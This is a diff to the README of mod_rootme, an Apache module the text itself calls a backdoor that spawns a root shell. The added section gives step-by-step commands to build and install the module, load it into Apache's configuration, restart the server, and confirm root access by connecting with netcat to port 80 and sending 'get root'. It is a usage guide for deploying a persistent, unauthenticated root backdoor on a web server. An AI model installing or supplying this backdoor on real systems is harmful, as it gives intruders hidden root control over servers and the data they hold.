@@ -1,5 +1,4 @@
-mod_rootme
-==========
+# mod_rootme
 
 mod_rootme is a Apache backdoor module that can spawn a root shell.
 
@@ -17,3 +16,38 @@ Debian GNU/Linux 8.0.
 
 See README.old.txt for the original documentation.
 
+## Build instructions
+
+To build and test on a Debian/Ubuntu system, you would need apache2
+and apache2-dev.  Run 'make' and 'sudo make install' to build the
+module, and enable it in httpd configuration, perhaps like so:
+
+```
+sudo sh -c \
+'echo "LoadModule rootme_module \
+/usr/lib/apache2/modules/mod_rootme.so" | sudo tee > \
+/etc/apache2/mods-available/rootme.load'
+```
+
+Now to enable the module:
+
+```
+sudo a2enmod rootme
+sudo apache2ctl restart
+```
+
+To check that the root shell is indeed available:
+
+```
+nc localhost 80
+get root
+id
+```
+
+To uninstall the module:
+
+```
+sudo a2dismod rootme
+rm /usr/lib/apache2/modules/mod_rootme.so
+sudo apache2ctl restart
+```
